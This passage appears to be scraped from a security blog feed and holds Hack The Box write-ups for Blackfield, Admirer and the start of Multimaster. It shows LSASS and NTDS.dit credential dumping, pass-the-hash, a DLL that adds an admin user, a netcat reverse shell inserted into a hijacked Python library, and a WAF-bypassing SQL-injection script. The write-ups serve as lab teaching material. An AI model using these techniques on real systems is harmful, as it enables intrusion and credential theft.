the Audit2020 user. The first password entered is the new password for audit2020, here we’ll use Password123. The second password prompt is the password for the Support user.snowscan@kali:~/htb/blackfield_demo$ net rpc password audit2020 -U support -S 10.10.10.192Enter new password for audit2020:Enter WORKGROUP\\support's password:Using crackmapexec, we can see that the new password works and that now have access to the forensic SMB share:snowscan@kali:~/htb/blackfield_demo$ crackmapexec smb 10.10.10.192 -u audit2020 -p Password123 --sharesSMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\\audit2020:Password123 SMB         10.10.10.192    445    DC01             [+] Enumerated sharesSMB         10.10.10.192    445    DC01             Share           Permissions     RemarkSMB         10.10.10.192    445    DC01             -----           -----------     ------SMB         10.10.10.192    445    DC01             ADMIN$                          Remote AdminSMB         10.10.10.192    445    DC01             C$                              Default shareSMB         10.10.10.192    445    DC01             forensic        READ            Forensic / Audit share.SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPCSMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share SMB         10.10.10.192    445    DC01             profiles$       READ            SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server shareGetting the NTLM hash for svc_backupAfter connecting to the SMB share we see a bunch of directories:snowscan@kali:~/htb/blackfield_demo$ smbclient -U audit2020%Password123 //10.10.10.192/forensicTry \"help\" to get a list of possible commands.smb: \\&gt; ls  .                                   D        0  Sun Feb 23 08:03:16 2020  ..                                  D        0  Sun Feb 23 08:03:16 2020  commands_output                     D        0  Sun Feb 23 13:14:37 2020  memory_analysis                     D        0  Thu May 28 16:28:33 2020  tools                               D        0  Sun Feb 23 08:39:08 2020Looking around the various directories we can see that they contain various forensic evidence like command output and memory captures. The one thing that stands out is we have a memory capture of the LSASS process in the lsass.zip file:smb: \\&gt; ls memory_analysis\\  .                                   D        0  Thu May 28 16:28:33 2020  ..                                  D        0  Thu May 28 16:28:33 2020  conhost.zip                         A 37876530  Thu May 28 16:25:36 2020  ctfmon.zip                          A 24962333  Thu May 28 16:25:45 2020  dfsrs.zip                           A 23993305  Thu May 28 16:25:54 2020  dllhost.zip                         A 18366396  Thu May 28 16:26:04 2020  ismserv.zip                         A  8810157  Thu May 28 16:26:13 2020  lsass.zip                           A 41936098  Thu May 28 16:25:08 2020  mmc.zip                             A 64288607  Thu May 28 16:25:25 2020LSASS is the Local Security Authority Subsystem Service in Windows that handles authentication and security policies. Basically, it holds all sorts of authentication information in its memory space.After downloading and extracting the file to our local Kali VM we’ll use the pypykatz tool to extract the credentials from the memory dump. Pypykatz is a Python implementation of Mimikatz.snowscan@kali:~/htb/blackfield_demo$ unzip lsass.zip Archive:  lsass.zip  inflating: lsass.DMP  snowscan@kali:~/htb/blackfield_demo$ pypykatz lsa minidump lsass.DMP |moreINFO:root:Parsing file lsass.DMPFILE: ======== lsass.DMP =======[...]\t== MSV ==\t\tUsername: svc_backup\t\tDomain: BLACKFIELD\t\tLM: NA\t\tNT: 9658d1d1dcd9250115e2205d9f48400d\t\tSHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c[...]luid 153705\t== MSV ==\t\tUsername: Administrator\t\tDomain: BLACKFIELD\t\tLM: NA\t\tNT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62\t\tSHA1: db5c89a961644f0978b4b69a4d2a2239d7886368We have both the Administrator and svc_backup user’s NTLM hash. To connect to a Windows machine without knowning the account password we can use the Pass-The-Hash technique which basically just uses the NTLM hash material as authentication. Various tools in the Impacket suite like wmiexec, smbexec and psexec support PTH but here we’ll instead connect with Evil-WinRM, an WinRM client that supports PTH along with other nice features like AMSI bypass and upload/download functionality.Unfortunately, it seems that the Administrator has been changed since the memory dump was taken and we can’t connect with the hash we got:snowscan@kali:~$ evil-winrm -u administrator -H 7f1e4ff8c6a8e6b6fcae2d9c0572cd62 -i 10.10.10.192Evil-WinRM shell v2.3Info: Establishing connection to remote endpointError: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationErrorError: Exiting with code 1But the svc_backup credentials hasn’t been changed and we can connect with the NTLM hash:snowscan@kali:~$ evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192Evil-WinRM shell v2.3Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents&gt;Privilege escalation to Administrator - Method #1The user svc_backup is a member of the Backup Operators group as shown by the net users svc_backup output.Local Group Memberships      *Backup Operators     *Remote Management UseGlobal Group memberships     *Domain UsersThe command completed successfully.Backup operators are dangerous because they can create a disk shadow copy and access files in-use by the system. The plan here is to grab a copy of the NTDS.dit file which contains all the Active Directory credentials. For some reason you need an extra space at the end of each line otherwise the diskshadow strips off a character and the command becomes invalid.*Evil-WinRM* PS C:\\temp&gt; upload pwn.txtInfo: Uploading pwn.txt to C:\\temp\\pwn.txt                                                             Data: 116 bytes of 116 bytes copiedInfo: Upload successful!*Evil-WinRM* PS C:\\temp&gt; type pwn.txtset context persistent nowritersadd volume c: alias pwncreateexpose %pwn% z:Using diskshadow we run the script and we end with a shadow drive Z:*Evil-WinRM* PS C:\\temp&gt; diskshadow /s pwn.txtMicrosoft DiskShadow version 1.0Copyright (C) 2013 Microsoft CorporationOn computer:  DC01,  9/1/2020 1:30:41 AM-&gt; set context persistent nowriters-&gt; add volume c: alias pwn-&gt; createAlias pwn for shadow ID {4aa7fb85-c839-4e4e-98e9-a949bfb83735} set as environment variable.Alias VSS_SHADOW_SET for shadow set ID {bf423ef5-badb-4ae0-aa45-53ae68e595f7} set as environment variable.Querying all shadow copies with the shadow copy set ID {bf423ef5-badb-4ae0-aa45-53ae68e595f7}\t* Shadow copy ID = {4aa7fb85-c839-4e4e-98e9-a949bfb83735}\t\t%pwn%\t\t- Shadow copy set: {bf423ef5-badb-4ae0-aa45-53ae68e595f7}\t%VSS_SHADOW_SET%\t\t- Original count of shadow copies = 1\t\t- Original volume name: \\\\?\\Volume{351b4712-0000-0000-0000-602200000000}\\ [C:\\]\t\t- Creation time: 9/1/2020 1:30:44 AM\t\t- Shadow copy device name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\t\t- Originating machine: DC01.BLACKFIELD.local\t\t- Service machine: DC01.BLACKFIELD.local\t\t- Not exposed\t\t- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}\t\t- Attributes:  No_Auto_Release Persistent No_Writers DifferentialNumber of shadow copies listed: 1-&gt; expose %pwn% z:-&gt; %pwn% = {4aa7fb85-c839-4e4e-98e9-a949bfb83735}The shadow copy was successfully exposed as z:\\.-&gt;We’ll use robocopy with the /b flag to ignore file permissions and copy the NTDS.dit file from the exposed disk shadow.Evil-WinRM* PS C:\\temp&gt; robocopy /b z:\\windows\\ntds . ntds.dit-------------------------------------------------------------------------------   ROBOCOPY     ::     Robust File Copy for Windows-------------------------------------------------------------------------------  Started : Friday, September 11, 2020 5:43:33 PM   Source : z:\\windows\\ntds\\     Dest : C:\\temp\\    Files : ntds.dit  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30------------------------------------------------------------------------------\t                   1\tz:\\windows\\ntds\\\t    New File  \t\t  18.0 m\tntds.dit\t    *Evil-WinRM* PS C:\\temp&gt; download ntds.ditInfo: Downloading C:\\temp\\ntds.dit to ntds.ditWe also need the SYSTEM hive that contains the encryption key for the NTDS.dit file. The built-in download functionality in Evil-WinRM is kinda slow so it takes a few minutes to download the file.*Evil-WinRM* PS C:\\temp&gt; reg save HKLM\\SYSTEM c:\\temp\\systemThe operation completed successfully.*Evil-WinRM* PS C:\\temp&gt; download systemInfo: Downloading C:\\temp\\system to system                                                             Info: Download successful!Using Impacket’s secretsdump script we can open the NTDS.dit and extract the NTLM hashes for the domain accounts. We now have the hash for the Administrator account.snowscan@kali:~/htb/blackfield_demo$ impacket-secretsdump -ntds ntds.dit -system system localImpacket v0.9.21 - Copyright 2020 SecureAuth Corporation[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)[*] Searching for pekList, be patient[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c[*] Reading and decrypting hashes from ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::DC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::audit2020:1103:aad3b435b51404eeaad3b435b51404ee:c95ac94a048e7c29ac4b4320d7c9d3b5:::support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::[...]We can use Pass-The-Hash again with the admin’s hash, get a shell and read the root.txt flag.snowscan@kali:~/htb/blackfield_demo$ evil-winrm -H 184fb5e5178480be64824d4cd53b99ee -u administrator -i 10.10.10.192Evil-WinRM shell v2.3Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; type ..\\desktop\\root.txt4375a629c7c67c8e29db269060c955cbPrivilege escalation to Administrator - Method #2With the Backup Operators group membership we can write files anywhere on the system, including C:\\Windows\\System32. The Update Session Orchestrator service is vulnerable to DLL hijacking because it tries to load a non-existent DLL (windowscoredeviceinfo.dll). By placing a DLL called windowscoredeviceinfo.dll in the c:\\windows\\system32 directory, it will be loaded by the service and we will gain code execution in a SYSTEM context.We can use the following simple DLL that creates a new user and adds it to the local administrator’s group.#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int pwn(){\tWinExec(\"C:\\\\Windows\\\\System32\\\\net.exe users snowscan Yolo1234! /add\", 0);\tWinExec(\"C:\\\\Windows\\\\System32\\\\net.exe localgroup administrators snowscan /add\", 0);\treturn 0;}BOOL APIENTRY DllMain(HMODULE hModule,\tDWORD  ul_reason_for_call,\tLPVOID lpReserved){\tswitch (ul_reason_for_call)\t{\tcase DLL_PROCESS_ATTACH:\t\tpwn();\tcase DLL_THREAD_ATTACH:\tcase DLL_THREAD_DETACH:\tcase DLL_PROCESS_DETACH:\t\tbreak;\t}\treturn TRUE;}Here’s how we can compile the DLL directly from Linux.x86_64-w64-mingw32-gcc -o windowscoredeviceinfo.dll pwn.c -sharedWe’ll create a temporary directory and upload the required files there.evil-winrm -H 9658d1d1dcd9250115e2205d9f48400d -u svc_backup -i 10.10.10.192mkdir c:\\tempmkdir c:\\temp\\system32cd c:\\temp\\system32upload windowscoredeviceinfo.dllcd ..upload UsoDllLoader.exeNext, we’ll use robocopy with the /b flag to copy the contents of system32 into c:\\windows\\system32. This will use the special backup operator’s privilege to bypass the permission check and allow us to write the DLL.*Evil-WinRM* PS C:\\temp&gt; robocopy /b system32 c:\\windows\\system32-------------------------------------------------------------------------------   ROBOCOPY     ::     Robust File Copy for Windows-------------------------------------------------------------------------------  Started : Friday, September 11, 2020 5:10:01 PM   Source : C:\\temp\\system32\\     Dest : c:\\windows\\system32\\    Files : *.*  Options : *.* /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30------------------------------------------------------------------------------\t                   2\tC:\\temp\\system32\\\t*EXTRA Dir        -1\tc:\\windows\\system32\\0409\\\t*EXTRA Dir        -1\tc:\\windows\\system32\\ADDSDeployment_Internal\\\t*EXTRA Dir        -1\tc:\\windows\\system32\\adprep\\\t*EXTRA Dir        -1\tc:\\windows\\system32\\AdvancedInstallers\\[...]\t  *EXTRA File \t\t   30720\tztrace_maps.dll\t    New File  \t\t  278213\tWindowsCoreDeviceInfo.dllTo trigger the DLL file, we’ll use the UsoDllLoader exploit (we can ignore the error messages).*Evil-WinRM* PS C:\\temp&gt; .\\usodllloader.exe[*] Using UpdateOrchestrator-&gt;StartScan()    |__ Creating instance of 'UpdateSessionOrchestrator'... Done.    |__ Creating a new Update Session... Done.    |__ Calling 'StartScan'... Done.[-] Unable to connect to server![*] Retrying with UpdateOrchestrator-&gt;StartInteractiveScan()    |__ Creating instance of 'UpdateSessionOrchestrator'... Done.    |__ Creating a new Update Session... Done.    |__ Calling 'StartInteractiveScan'... Done.[-] Unable to connect to server![*] Retrying with UpdateOrchestrator-&gt;StartDownload()    |__ Creating instance of 'UpdateSessionOrchestrator'... Done.    |__ Creating a new Update Session... Done.    |__ Calling 'StartDownload'... Done.[-] Unable to connect to server![-] Exploit failed.We now see that our user has been created, with local admin rights:*Evil-WinRM* PS C:\\temp&gt; net users snowscanUser name                    snowscanFull NameCommentUser's commentCountry/region code          000 (System Default)Account active               YesAccount expires              NeverPassword last set            9/11/2020 5:10:46 PMPassword expires             10/23/2020 5:10:46 PMPassword changeable          9/12/2020 5:10:46 PMPassword required            YesUser may change password     YesWorkstations allowed         AllLogon scriptUser profileHome directoryLast logon                   NeverLogon hours allowed          AllLocal Group Memberships      *AdministratorsGlobal Group memberships     *Domain UsersThe command completed successfully.Womp womp… Even as a local administrator we can’t read root.txt, what’s going on?*Evil-WinRM* PS C:\\users\\administrator\\desktop&gt; whoamiblackfield\\snowscan*Evil-WinRM* PS C:\\users\\administrator\\desktop&gt; type root.txtAccess to the path 'C:\\users\\administrator\\desktop\\root.txt' is denied.The file is EFS encrypted so that’s why we can’t read it:*Evil-WinRM* PS C:\\users\\administrator\\desktop&gt; cipher /c root.txt Listing C:\\users\\administrator\\desktop\\ New files added to this directory will not be encrypted.E root.txt  Compatibility Level:    Windows Vista/Server 2008As I understand it, the file is encrypted with a certificate which is stored in the Windows Certificate store and only the Administrator user can access it. So if we change the administrator password and log in as administrator we’ll still be able to read the file since the cert can be retrieved:*Evil-WinRM* PS C:\\Users\\snowscan\\Documents&gt; net users administrator Yolo1234!The command completed successfully.*Evil-WinRM* PS C:\\Users\\snowscan\\Documents&gt; exitInfo: Exiting with code 0snowscan@kali:~/htb/blackfield_demo$ evil-winrm -u administrator -p 'Yolo1234!' -i 10.10.10.192Evil-WinRM shell v2.3Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; type ..\\desktop\\root.txt9bdcc2eb072ca602a49faf7d34675056Another way we could solve this without changing the password is to dump LSASS with procdump.exe, secretsdump.py, etc. then get the administrator hash and log in as administrator using the Pass-The-Hash technique."
  },
  
  {
    "title": "Admirer - Hack The Box",
    "url": "/posts/htb-writeup-admirer/",
    "categories": "hackthebox, infosec",
    "tags": "plaintext creds, gobuster, ftp, rogue mysql, python, sudo, setenv",
    "date": "2020-09-26 00:00:00 +0800",
    





    
    "snippet": "Admirer is an easy box with the typical ‘gobuster/find creds on the webserver’ part, but after we use a Rogue MySQL server to read files from the server file system, then for privesc there’s a cool...",
    "content": "Admirer is an easy box with the typical ‘gobuster/find creds on the webserver’ part, but after we use a Rogue MySQL server to read files from the server file system, then for privesc there’s a cool sudo trick with environment variables so we can hijack the python library path and get RCE as root.Portscan# nmap -sC -sV -p- 10.10.10.187Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-02 18:23 EDTNmap scan report for admirer.htb (10.10.10.187)Host is up (0.019s latency).Not shown: 65532 closed portsPORT   STATE SERVICE VERSION21/tcp open  ftp     vsftpd 3.0.322/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)| ssh-hostkey: |   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)80/tcp open  http    Apache httpd 2.4.25 ((Debian))| http-robots.txt: 1 disallowed entry |_/admin-dir|_http-server-header: Apache/2.4.25 (Debian)|_http-title: AdmirerService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 27.09 secondsFTPAnonymous access is not enabled and I don’t know of any public exploit for this version of vsFTPd.root@kali:~/htb/admirer# ftp 10.10.10.187Connected to 10.10.10.187.220 (vsFTPd 3.0.3)Name (10.10.10.187:root): anonymous530 Permission denied.Login failed.WebsiteThe website has a bunch of pictures but nothing else interesting. The about link with the contact form at the bottom of the page is not functional.From the nmap scan, we already picked up the content of robots.txt, so I know there’s an /admin-dir directory but I don’t have access to it (Forbidden error.From the gobuster scan, I pick up two files:root@kali:~/htb/admirer# gobuster dir -w ~/tools/SecLists/Discovery/Web-Content/big.txt -x txt -u http://admirer.htb/admin-dir[...]/contacts.txt (Status: 200)/credentials.txt (Status: 200)The contacts.txt file contains a bunch of email addresses:########### admins ############ PennyEmail: p.wise@admirer.htb############### developers ################ RajeshEmail: r.nayyar@admirer.htb# AmyEmail: a.bialik@admirer.htb# LeonardEmail: l.galecki@admirer.htb############## designers ############### HowardEmail: h.helberg@admirer.htb# BernadetteEmail: b.rauch@admirer.htbThe credentials.txt file contains some credentials for email, ftp and wordpress accounts:[Internal mail account]w.cooper@admirer.htbfgJr6q#S\\W:$P[FTP account]ftpuser%n?4Wz}R$tTF7[Wordpress account]adminw0rdpr3ss01!Source filesUsing the ftpuser credentials obtained from the credential file, I found a SQL dump file and an archive that contains the source files of the website.root@kali:~/htb/admirer# ftp 10.10.10.187Connected to 10.10.10.187.220 (vsFTPd 3.0.3)Name (10.10.10.187:root): ftpuser331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.-rw-r--r--    1 0        0            3405 Dec 02 21:24 dump.sql-rw-r--r--    1 0        0         5270987 Dec 03 21:20 html.tar.gz226 Directory send OK.After unpacking, we have the source code and some directories like utility-scripts and w4ld0s_s3cr3t_d1r:assets  html.tar.gz  images  index.php  robots.txt  utility-scripts  w4ld0s_s3cr3t_d1rAnalysing the source files, I found the following creds:index.php$servername = \"localhost\";$username = \"waldo\";$password = \"]F7jLHw:*G&gt;UPrTo}~A\"d6b\";$dbname = \"admirerdb\";db_admin.php$servername = \"localhost\";$username = \"waldo\";$password = \"Wh3r3_1s_w4ld0?\";On the production server I can’t find the db_admin.php file so I re-ran gobuster in the /utility-scripts directory and found an additional file.root@kali:~/htb/admirer# gobuster dir -w ~/tools/SecLists/Discovery/Web-Content/big.txt -x txt,php -u http://admirer.htb/utility-scripts[...]/adminer.php (Status: 200)/info.php (Status: 200)/phptest.php (Status: 200)Reading files through AdminerI can connect to any server using the interface so by using a rogue MySQL server running on my VM I was able to read files from the target system. I read /var/www/html/index.php and obtained the real DB password running on the target system.$servername = \"localhost\";\\n$username = \"waldo\";\\n$password = \"&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;\";\\n$dbname = \"admirerdb\";\\n\\n// Create connection\\n$conn = new mysqli($servername, $username, $password, $dbname);\\nI can log in with SSH with the waldo username:root@kali:~/htb/admirer# ssh waldo@10.10.10.187waldo@10.10.10.187's password: Linux admirer 4.9.0-12-amd64 x86_64 GNU/LinuxThe programs included with the Devuan GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.You have new mail.Last login: Sat May  2 23:04:06 2020 from 10.10.14.26waldo@admirer:~$ cat user.txtf6fc72bf41c41ed65d4ca1e95ef76dbePrivescWaldo can run /opt/scripts/admin_tasks.sh as any user. The sudo command is configured to accept environment variables (SETENV).waldo@admirer:~$ sudo -l[sudo] password for waldo: Matching Defaults entries for waldo on admirer:    env_reset, env_file=/etc/sudoenv, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, listpw=alwaysUser waldo may run the following commands on admirer:    (ALL) SETENV: /opt/scripts/admin_tasks.shIn /var/tmp/snow I’ll copy shutil.py, add a system call to execute netcat then hijack the library import by setting the PYTHONVARIABLE to this directory.def make_archive(base_name, format, root_dir=None, base_dir=None, verbose=0,                 dry_run=0, owner=None, group=None, logger=None):[...]    os.system(\"/bin/nc -e /bin/bash 10.10.14.22 443\")    save_cwd = os.getcwd()Execution:waldo@admirer:/var/tmp/snow$ sudo -E PYTHONPATH=/var/tmp/snow /opt/scripts/admin_tasks.sh[[[ System Administration Menu ]]]1) View system uptime2) View logged in users3) View crontab4) Backup passwd file5) Backup shadow file6) Backup web data7) Backup DB8) QuitChoose an option: 6Running backup script in the background, it might take a while...Shell:root@kali:~/htb/admirer# rlwrap nc -lvnp 443listening on [any] 443 ...connect to [10.10.14.22] from (UNKNOWN) [10.10.10.187] 40322iduid=0(root) gid=0(root) groups=0(root)cat /root/root.txtf24b1746556cc00321b58a6f6842bed7"
  },
  
  {
    "title": "Multimaster - Hack The Box",
    "url": "/posts/htb-writeup-multimaster/",
    "categories": "hackthebox, infosec",
    "tags": "ad, password spray, kerberoasting, keccak, sqli, winrm, powerview, vs code, chisel, server operators, backup operators",
    "date": "2020-09-19 00:00:00 +0800",
    





    
    "snippet": "Multimaster was a challenging Windows machine that starts with an SQL injection so we can get a list of hashes. The box author threw a little curve ball here and it took me a while to figure that t...",
    "content": "Multimaster was a challenging Windows machine that starts with an SQL injection so we can get a list of hashes. The box author threw a little curve ball here and it took me a while to figure that the hash type was Keccak-384, and not SHA-384. After successfully spraying the cracked password, we exploit a local command execution vulnerability in VS Code, then find a password in a DLL file, perform a targeted Kerberoasting attack and finally use our Server Operators group membership to get the flag.Summary  There’s an SQL injection in the web application search API the allow use to get database hashes  After finding that the hash used is Keccak-384, we are able to crack 3 passwords  After bruteforcing usernames with kerbrute, we spray the passwords we found and get one valid account for alcibiades  User alcibiades can log in with WinRM and we use a local command execution vulnerability in VS Code to get another shell as user cyork  User cyork has access to the .dll file of the ASP .NET webapp which contains the password D3veL0pM3nT! for the database finder user  We spray that D3veL0pM3nT! password and find that sbauer uses the same password  User sbauer has GenericWrite rights on user jorden so we can add an SPN to that user and kerberoast it  After cracking the hash for jorden and logging in, we see that he is a member of Server Operators  Server Operators have SeBackupPrivilege rights so we can read the administrators flag filePortscanSince this is a Windows box, I expected there would be many ports open.A few things stand out looking at the nmap output:  It’s a domain controller because port 88 is open  The domain is MEGACORP.LOCAL  Microsoft SQL Server is running  IIS is running, maybe there’s a web app that uses an SQL backend  RDP is open but I doubt we can do anything with itroot@kali:~/htb/multimaster# nmap -p- 10.10.10.179[..]]PORT      STATE  SERVICE       VERSION53/tcp    open   domain?| fingerprint-strings: |   DNSVersionBindReqTCP: |     version|_    bind80/tcp    open   http          Microsoft IIS httpd 10.0| http-methods: |_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: MegaCorp88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2020-03-07 19:24:04Z)135/tcp   open   msrpc         Microsoft Windows RPC139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)445/tcp   open   microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)464/tcp   open   kpasswd5?593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0636/tcp   open   tcpwrapped1433/tcp  open   ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM| ms-sql-ntlm-info: |   Target_Name: MEGACORP|   NetBIOS_Domain_Name: MEGACORP|   NetBIOS_Computer_Name: MULTIMASTER|   DNS_Domain_Name: MEGACORP.LOCAL|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL|   DNS_Tree_Name: MEGACORP.LOCAL|_  Product_Version: 10.0.14393| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback| Not valid before: 2020-03-07T19:10:19|_Not valid after:  2050-03-07T19:10:19|_ssl-date: 2020-03-07T19:26:37+00:00; +9m03s from scanner time.3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)3269/tcp  open   tcpwrapped3389/tcp  open   ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info: |   Target_Name: MEGACORP|   NetBIOS_Domain_Name: MEGACORP|   NetBIOS_Computer_Name: MULTIMASTER|   DNS_Domain_Name: MEGACORP.LOCAL|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL|   DNS_Tree_Name: MEGACORP.LOCAL|   Product_Version: 10.0.14393|_  System_Time: 2020-03-07T19:26:23+00:00| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL| Not valid before: 2020-03-06T19:09:42|_Not valid after:  2020-09-05T19:09:42|_ssl-date: 2020-03-07T19:26:36+00:00; +9m02s from scanner time.5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp  open   mc-nmf        .NET Message Framing47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open   msrpc         Microsoft Windows RPC49665/tcp open   msrpc         Microsoft Windows RPC49666/tcp open   msrpc         Microsoft Windows RPC49667/tcp open   msrpc         Microsoft Windows RPC49673/tcp open   msrpc         Microsoft Windows RPC49674/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.049675/tcp open   msrpc         Microsoft Windows RPC49676/tcp open   msrpc         Microsoft Windows RPC49693/tcp open   msrpc         Microsoft Windows RPC49696/tcp open   msrpc         Microsoft Windows RPC63393/tcp closed unknown63421/tcp closed unknownWeb enumerationThe website is an employee hub page written in Vue.js, but most of the links are not working.The login page is also not functional.The only thing that appears to work is the ‘Colleague Finder’ page:The output from the query is JSON and Vue.js takes care of rendering the page.When I tried different SQL injection payloads like single quotes I got 403 error messages, as well as when I sent too many queries so I knew there was some kind of WAF on the box. However by unicode encoding the characters I was able to bypass the WAF. Here I replaced a single quote by its unicode encoding and got a null answer instead of a 403 or empty JSON array.I wrote a quick script to make SQLi testing faster than using Burp.#!/usr/bin/pythonimport readlineimport requestsurl = \"http://10.10.10.179/api/getColleagues\"proxies = { \"http\": \"127.0.0.1:8080\" }def unicode_crap(txt):\tout = \"\"\tfor i in txt:\t\tout = out + '\\\\u00%s' % hex(ord(i))[2:]\treturn outwhile True:\theaders = {\t\t\"Content-type\": \"application/json\"\t}\tcmd = raw_input(\"&gt; \")\tencoded_cmd = unicode_crap(cmd)\tpayload = '{\"name\": \"' + encoded_cmd + '\"}'\tprint payload\tr = requests.post(url, data=payload, headers=headers, proxies=proxies)\tprint r.text\tprint(\"------------------------------------------------------\")Here, I found how many columns were in the table and I was able to use a UNION injection to include arbitrary data.Found the current DB name: Hub_DBEnumerated the tables in the database: Colleagues and LoginsIn the Logins table, I enumerated the columns and found the password one:Then I had all the pieces I needed to dump the Logins table:There’s a bunch of accounts in there and after cleaning up the duplicate hashes I have the following list:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f08139777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babcfb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfaAt first that looked like some SHA-384 hashes but after trying a few different hash algorithms I was able to crack all of them except one using Keccak-384.hashcat -a 0 -m 17900 --force users_sqli_dump_hashes.txt /usr/share/wordlists/rockyou.txtEnumerating users on the boxTo check for valid accounts on the system I used kerbrute with the xato-net-10-million-usernames.txt wordlist.The highlighted account alcibiades@megacorp.local is the one I was able to password spray.Password spraying the credentials from the databaseTo password spray, I built a user file containing all the stuff from kerbrute plus the other accounts I had found from the SQL database. The password file only has the 3 password I managed to crack from the SQL hashes.Then I used crackmapexec to check the user/pass combinations against SMB.As shown above, the alcibiades:finance1 are valid credentials.The alcibiades user can log in to the machine with WinRM and I was able to get the user flag.Setting up Windows routing through Kali and joining the domainSince this was a Windows box with Active Directory running I expected I would need to run various tools from Powershell and I didn’t want to have to fight the AV running on the box so I fired up my Commando VM, routed it to the HTB lab through my Kali box (where NAT was configured) and joined it to the domain.Here’s my script to configure IPv4 forwarding and NAT in Kali#!/bin/shecho 1 &gt; /proc/sys/net/ipv4/ip_forward/sbin/iptables -t nat -A POSTROUTING -o tun0 -j MASQUERADE/sbin/iptables -A FORWARD -i eth0 -o tun0 -j ACCEPTAnd here’s how I added the route for 10.10.10.0/24 on Windows (note the -p arguments, this is important so I don’t lose the changes after the reboot)I also configured my DNS settings to point to 10.10.10.179 so I can find the megacorp.local domain.By default, Windows users can add up to 10 machines to the domain so I just added my VM using the credentials from alcibiadesAfter rebooting, I added the alcibiades users to the local administators group on my machine. Luckily for me, there wasn’t any GPO preventing me from logging in with my local admin account.PS C:\\Windows\\system32 &gt; net localgroup administrators alcibiades /addThe command completed successfully.Now I can log in to the server from my Windows VM:Priv esc from alcibiades to cyorkAlcibiades doesn’t have any special privileges and he’s just a member of the Domain Users group and the Remote Management Users. I did notice that there was some odd ports listening on localhost when I checked out the netstat output.The ports did seem to change every few minutes because when I re-ran the command I got different results. This pointed me in the direction of some scheduled task running in the background.Checking the list of running processes I noticed that the VS Code application was running. When I checked the output a few times I saw that the PID was changing so I assumed this was the scheduled task running. I tried listing the scheduled tasks from 